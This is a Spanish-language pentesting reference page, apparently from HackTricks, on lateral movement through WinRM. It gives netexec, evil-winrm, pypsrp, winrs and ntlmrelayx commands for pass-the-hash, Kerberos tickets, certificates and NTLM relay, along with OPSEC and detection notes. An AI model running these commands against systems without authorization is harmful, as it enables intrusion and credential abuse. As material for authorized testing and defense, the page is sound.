# WinRM

{{#include ../../banners/hacktricks-training.md}}

WinRM es uno de los transportes de **lateral movement** más convenientes en entornos Windows, ya que proporciona un shell remoto a través de **WS-Man/HTTP(S)** sin necesidad de trucos para crear servicios mediante SMB. Si el objetivo expone **5985/5986** y tu principal tiene permiso para usar remoting, a menudo puedes pasar de «credenciales válidas» a «shell interactivo» muy rápidamente.

Para la **enumeración del protocolo/servicio**, los listeners, la habilitación de WinRM, `Invoke-Command` y el uso genérico del cliente, consulta:

{{#ref}}
../../network-services-pentesting/5985-5986-pentesting-winrm.md
{{#endref}}

## Por qué a los operadores les gusta WinRM

- Usa **HTTP/HTTPS** en lugar de SMB/RPC, por lo que suele funcionar donde se bloquea la ejecución al estilo PsExec.
- Con **Kerberos**, evita enviar credenciales reutilizables al objetivo.
- Funciona sin problemas desde herramientas de **Windows**, **Linux** y **Python** (`winrs`, `evil-winrm`, `pypsrp`, `netexec`).
- La ruta interactiva de PowerShell remoting inicia **`wsmprovhost.exe`** en el objetivo bajo el contexto del usuario autenticado, lo cual es distinto, desde el punto de vista operativo, de la ejecución basada en servicios.

## Modelo de acceso y requisitos previos

En la práctica, el éxito del lateral movement mediante WinRM depende de **tres** cosas:

1. El objetivo tiene un **listener de WinRM** (`5985`/`5986`) y reglas de firewall que permiten el acceso.
2. La cuenta puede **autenticarse** en el endpoint.
3. La cuenta tiene permiso para **abrir una sesión de remoting**.

Formas habituales de obtener ese acceso:

- **Administrador local** en el objetivo.
- Pertenecer a **Remote Management Users** en sistemas más recientes o a **WinRMRemoteWMIUsers__** en sistemas/componentes que todavía reconocen ese grupo.
- Derechos de remoting delegados explícitamente mediante descriptores de seguridad locales / cambios en las ACL de PowerShell remoting.

Si ya tienes el control de un equipo con derechos de administrador, recuerda que también puedes **delegar acceso a WinRM sin pertenecer al grupo de administradores** mediante las técnicas descritas aquí:

{{#ref}}
../active-directory-methodology/security-descriptors.md
{{#endref}}

### Particularidades de la autenticación importantes durante el lateral movement

- **Kerberos requiere un hostname/FQDN**. Si te conectas mediante una IP, el cliente suele recurrir a **NTLM/Negotiate**.
- En casos límite de **workgroup** o de relaciones de confianza entre dominios, NTLM suele requerir **HTTPS** o que el objetivo se añada a **TrustedHosts** en el cliente.
- Con **cuentas locales** mediante Negotiate en un workgroup, las restricciones remotas de UAC pueden impedir el acceso, a menos que se use la cuenta de Administrador integrada o `LocalAccountTokenFilterPolicy=1`.
- PowerShell remoting usa por defecto el **SPN `HTTP/<host>`**. En entornos donde `HTTP/<host>` ya está registrado para otra cuenta de servicio, Kerberos de WinRM puede fallar con `0x80090322`; usa un SPN que incluya el puerto o cambia a **`WSMAN/<host>`** cuando exista ese SPN.<sup>[[3]](#references)</sup>

Si consigues credenciales válidas durante un password spraying, validarlas mediante WinRM suele ser la forma más rápida de comprobar si te permiten obtener un shell:

{{#ref}}
../active-directory-methodology/password-spraying.md
{{#endref}}

## Lateral movement de Linux a Windows

### NetExec / CrackMapExec para validar y ejecutar comandos de una sola vez

```bash
# Validate creds and execute a simple command
netexec winrm <HOST_FQDN> -u <USER> -p '<PASSWORD>' -x "whoami /all"

# Pass-the-Hash
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -x "hostname"

# PowerShell command instead of cmd.exe
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -X '$PSVersionTable'
```

### Evil-WinRM para shells interactivos

`evil-winrm` sigue siendo la opción interactiva más conveniente desde Linux porque admite **contraseñas**, **hashes NT**, **tickets Kerberos**, **certificados de cliente**, transferencia de archivos y carga en memoria de PowerShell/.NET.

```bash
# Password
evil-winrm -i <HOST_FQDN> -u <USER> -p '<PASSWORD>'

# Pass-the-Hash
evil-winrm -i <HOST_FQDN> -u <USER> -H <NTHASH>

# Kerberos using an existing ccache/kirbi
export KRB5CCNAME=./user.ccache
evil-winrm -i <HOST_FQDN> -r <REALM.LOCAL>
```

### Caso límite de Kerberos SPN: `HTTP` vs `WSMAN`

Cuando el SPN predeterminado **`HTTP/<host>`** provoca errores de Kerberos, prueba a solicitar/usar un ticket **`WSMAN/<host>`** en su lugar. Esto puede ocurrir en entornos empresariales reforzados o inusuales donde **`HTTP/<host>`** ya está asociado a otra cuenta de servicio.<sup>[[3]](#references)</sup>

```bash
# Example: use a WSMAN ticket instead of the default HTTP SPN
export KRB5CCNAME=administrator@WSMAN_srv01.domain.local@DOMAIN.LOCAL.ccache
evil-winrm -i srv01.domain.local -r DOMAIN.LOCAL --spn WSMAN
```

Esto también es útil después del abuso de **RBCD / S4U** cuando forjaste o solicitaste específicamente un ticket de servicio **WSMAN** en lugar de un ticket genérico `HTTP`.

### Autenticación basada en certificados

WinRM también admite la **autenticación de cliente mediante certificado**, pero el certificado debe estar asignado a una **cuenta local** en el destino. Desde una perspectiva ofensiva, esto es importante cuando:

- robaste/exportaste un certificado de cliente válido y una clave privada ya asignados para WinRM;
- abusaste de **AD CS / Pass-the-Certificate** para obtener un certificado para un principal y luego pivotar a otra ruta de autenticación;
- operas en entornos que evitan deliberadamente el acceso remoto basado en contraseñas.

```bash
evil-winrm -i <HOST_FQDN> -S -c user.crt -k user.key
```

La autenticación de WinRM con certificados de cliente es mucho menos común que la autenticación con contraseña/hash/Kerberos, pero, cuando existe, puede ofrecer una vía de **movimiento lateral sin contraseña** que persiste tras la rotación de contraseñas.

### Python / automatización con `pypsrp`

Si necesitas automatización en lugar de una shell de operador, `pypsrp` ofrece WinRM/PSRP desde Python con compatibilidad para **NTLM**, **autenticación con certificados**, **Kerberos** y **CredSSP**.<sup>[[2]](#references)</sup>

```python
from pypsrp.client import Client

client = Client(
    "srv01.domain.local",
    username="DOMAIN\\user",
    password="Password123!",
    ssl=False,
)
stdout, stderr, rc = client.execute_cmd("whoami /all")
print(stdout, stderr, rc)
```


Si necesitas un control más preciso que el que ofrece el wrapper de alto nivel `Client`, las API de nivel más bajo `WSMan` + `RunspacePool` son útiles para resolver dos problemas comunes del operador:

- forzar **`WSMAN`** como servicio/SPN de Kerberos en lugar de la expectativa predeterminada de `HTTP` que usan muchos clientes de PowerShell;
- conectarse a un endpoint PSRP que no sea el predeterminado, como una configuración de sesión **JEA** / personalizada, en lugar de `Microsoft.PowerShell`.

```python
from pypsrp.wsman import WSMan
from pypsrp.powershell import PowerShell, RunspacePool

wsman = WSMan(
    "srv01.domain.local",
    auth="kerberos",
    ssl=False,
    negotiate_service="WSMAN",
)

with wsman, RunspacePool(wsman, configuration_name="MyJEAEndpoint") as pool, PowerShell(pool) as ps:
    ps.add_script("whoami; Get-Command")
    output = ps.invoke()
    print(output)
```

### Los endpoints PSRP personalizados y JEA son importantes durante el movimiento lateral

Una autenticación de WinRM exitosa **no** siempre significa que llegas al endpoint predeterminado sin restricciones `Microsoft.PowerShell`. Los entornos maduros pueden exponer **configuraciones de sesión personalizadas** o endpoints de **JEA** con sus propias ACL y comportamiento de run-as.<sup>[[1]](#references)</sup>

Si ya tienes ejecución de código en un host Windows y quieres averiguar qué superficies de remoting existen, enumera los endpoints registrados:

```powershell
Get-PSSessionConfiguration | Select-Object Name, Permission
```

Cuando exista un endpoint útil, dirígete explícitamente a él en lugar de usar el shell predeterminado:

```powershell
Enter-PSSession -ComputerName srv01.domain.local -ConfigurationName MyJEAEndpoint
```

Implicaciones prácticas para offensive:

- Un endpoint **restringido** puede ser suficiente para el movimiento lateral si expone los cmdlets/funciones adecuados para controlar servicios, acceder a archivos, crear procesos o ejecutar comandos arbitrarios de .NET / externos.
- Un rol de JEA **mal configurado** es especialmente valioso cuando expone comandos peligrosos como `Start-Process`, comodines amplios, providers con permisos de escritura o funciones proxy personalizadas que permiten escapar de las restricciones previstas.
- Los endpoints respaldados por **cuentas virtuales RunAs** o **gMSAs** cambian el contexto de seguridad efectivo de los comandos que ejecutas. En particular, un endpoint respaldado por una gMSA puede proporcionar **identidad de red en el segundo salto**, incluso cuando una sesión WinRM normal presenta el clásico problema de delegación.

En un endpoint personalizado restringido, inspecciona por separado los permisos efectivos sobre comandos y scripts: una lista breve de `Get-Command` por sí sola no demuestra que no se pueda ejecutar un `.ps1` existente. Las [capacidades de rol de JEA](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/role-capabilities) controlan explícitamente qué rutas de script se pueden invocar; otros endpoints personalizados pueden aplicar reglas de sesión diferentes. Si un script permitido usa un `SecureString` almacenado para crear una credencial para otro host, un blob creado sin una clave explícita usa [Windows DPAPI](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring) y, por lo general, necesita el contexto del usuario y la máquina que lo protegieron para descifrarlo. Revisa la ACL del script, los permisos de invocación, la identidad de ejecución y los permisos de las credenciales en los sistemas posteriores antes de considerar que un código fuente modificable o un blob copiado permitan una escalada entre hosts. No imprimas el valor protegido durante la enumeración pasiva.

Para una función personalizada de JEA que acepta una ruta de archivo, revisa conjuntamente la ACL del endpoint registrado, la capacidad de rol asignada y la identidad de ejecución efectiva. Un usuario puede tener `NoLanguage` mientras que el cuerpo de la función se ejecuta en el modo de lenguaje predeterminado del sistema; una cuenta virtual también puede tener privilegios de administrador local. Si la función comprueba un directorio permitido usando un prefijo de cadena sin procesar y luego lee la ruta proporcionada, los componentes `..` pueden resolver fuera de ese directorio. El límite es la ruta resuelta bajo la identidad de la función, no el modo de lenguaje del usuario ni el prefijo aparente. Confirma qué función es accesible y cómo valida la ruta final antes de considerar que un archivo `.psrc` o `.pssc` legible constituye un hallazgo de lectura de archivos privilegiados. Consulta las directrices de Microsoft sobre [capacidades de rol de JEA](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/role-capabilities) y [consideraciones de seguridad](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/security-considerations).

## Movimiento lateral con WinRM nativo de Windows

### `winrs.exe`

`winrs.exe` viene integrado y es útil cuando quieres **ejecución de comandos nativa de WinRM** sin abrir una sesión interactiva de PowerShell remoting:

```cmd
winrs -r:srv01.domain.local cmd /c whoami
winrs -r:https://srv01.domain.local:5986 -u:DOMAIN\\user -p:Password123! hostname
```

Hay dos flags que es fácil olvidar y que son importantes en la práctica:

- `/noprofile` suele ser necesario cuando la entidad remota **no** es un administrador local.
- `/allowdelegate` permite que el shell remoto use tus credenciales en un **tercer host** (por ejemplo, cuando el comando necesita `\\fileserver\share`).

```cmd
winrs -r:srv01.domain.local /noprofile cmd /c set
winrs -r:srv01.domain.local /allowdelegate cmd /c dir \\fileserver.domain.local\share
```

Operativamente, `winrs.exe` suele dar lugar a una cadena de procesos remotos similar a:

```text
svchost.exe (DcomLaunch) -> winrshost.exe -> cmd.exe /c <command>
```

Vale la pena recordarlo porque difiere de la ejecución basada en servicios y de las sesiones interactivas de PSRP.

### `winrm.cmd` / WS-Man COM en lugar de PowerShell remoting

También puedes ejecutar comandos mediante el **transporte WinRM** sin usar `Enter-PSSession`, invocando clases WMI a través de WS-Man. El transporte sigue siendo WinRM, mientras que el mecanismo de ejecución remota pasa a ser **WMI `Win32_Process.Create`**:

```cmd
winrm invoke Create wmicimv2/Win32_Process @{CommandLine="cmd.exe /c whoami > C:\\Windows\\Temp\\who.txt"} -r:srv01.domain.local
```

Ese enfoque es útil cuando:

- La actividad de PowerShell está muy supervisada.
- Quieres usar el **transporte WinRM**, pero no un flujo de trabajo clásico de PS remoting.
- Estás creando o usando herramientas personalizadas en torno al objeto COM **`WSMan.Automation`**.

## Relay NTLM a WinRM (WS-Man)

Cuando el relay SMB está bloqueado por la firma y el relay LDAP está restringido, **WS-Man/WinRM** puede seguir siendo un objetivo atractivo para relay. Las versiones modernas de `ntlmrelayx.py` incluyen servidores de relay WinRM y pueden hacer relay a objetivos **`wsman://`** o **`winrms://`**.

```bash
# Relay to HTTP WinRM
ntlmrelayx.py -t wsman://srv01.domain.local --no-smb-server -smb2support

# Relay to HTTPS WinRM
ntlmrelayx.py -t winrms://srv01.domain.local --no-smb-server -smb2support
```

Dos notas prácticas:

- Relay es más útil cuando el objetivo acepta **NTLM** y la identidad retransmitida tiene permiso para usar WinRM.
- El código reciente de Impacket gestiona específicamente las solicitudes **`WSMANIDENTIFY: unauthenticated`**, para que las pruebas del tipo `Test-WSMan` no interrumpan el flujo de relay.

Para las limitaciones de varios saltos tras establecer una primera sesión de WinRM, consulta:

{{#ref}}
../active-directory-methodology/kerberos-double-hop-problem.md
{{#endref}}

## Notas sobre OPSEC y detección

- **La remoting interactiva de PowerShell** suele crear **`wsmprovhost.exe`** en el objetivo.
- **`winrs.exe`** suele crear **`winrshost.exe`** y, después, el proceso secundario solicitado.
- Los endpoints **JEA** personalizados pueden ejecutar acciones como cuentas virtuales **`WinRM_VA_*`** o como una **gMSA** configurada, lo que modifica tanto la telemetría como el comportamiento del segundo salto en comparación con un shell normal en el contexto del usuario.<sup>[[1]](#references)</sup>
- Si usas PSRP en lugar de `cmd.exe` sin procesar, espera telemetría de **inicio de sesión de red**, eventos del servicio WinRM y registros operativos/de bloques de script de PowerShell.
- Si solo necesitas ejecutar un comando, `winrs.exe` o la ejecución de WinRM de una sola vez pueden generar menos ruido que una sesión interactiva de remoting de larga duración.
- Si Kerberos está disponible, prefiere **FQDN + Kerberos** en lugar de IP + NTLM para reducir tanto los problemas de confianza como la necesidad de modificar `TrustedHosts` en el cliente.

## References

- [1] [Microsoft: Consideraciones de seguridad de JEA](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/security-considerations?view=powershell-7.6)
- [2] [Léame de pypsrp](https://github.com/jborean93/pypsrp)
- [3] [Microsoft: Error `0x80090322` al conectar PowerShell a un servidor remoto mediante WinRM](https://learn.microsoft.com/en-us/troubleshoot/windows-server/system-management-components/error-0x80090322-when-connecting-powershell-to-remote-server-via-winrm)
{{#include ../../banners/hacktricks-training.md}}
